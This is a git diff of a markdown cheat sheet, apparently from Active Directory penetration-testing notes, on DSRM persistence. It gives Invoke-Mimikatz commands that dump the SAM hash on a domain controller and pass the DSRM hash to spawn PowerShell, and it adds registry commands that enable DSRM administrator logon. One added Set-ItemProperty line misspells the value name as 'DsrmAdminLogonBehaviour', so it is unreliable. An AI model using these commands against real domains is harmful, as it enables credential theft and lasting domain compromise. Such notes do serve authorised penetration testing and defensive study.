@@ -62,11 +62,18 @@ When a computer is promoted to Domain Controller, a DSRM password is set which i
 It can be extracted using:
 
 Note: Domain admin privs are required
+
 ```Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <domain_controller>```
 
 After obtaining the DSRM hash:
 
 ```Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC-computer> /user:Administrator /ntlm:<dsrm_hash> /run:powershell.exe"'```
 
+Before using the above command to use DSRM hash, first we need to change a registry key for changing the logon behaviour of DSRM. For that, just get inside DC as DA, and execute the following powershell command:
 
+```New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD```
+
+Sometime, you will see an error that this propery already exists. That means you don't need to create a new property using "New-ItemProperty" but you have to use "Set-ItemProperty" to change the value of that property:
+
+```Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2```
 
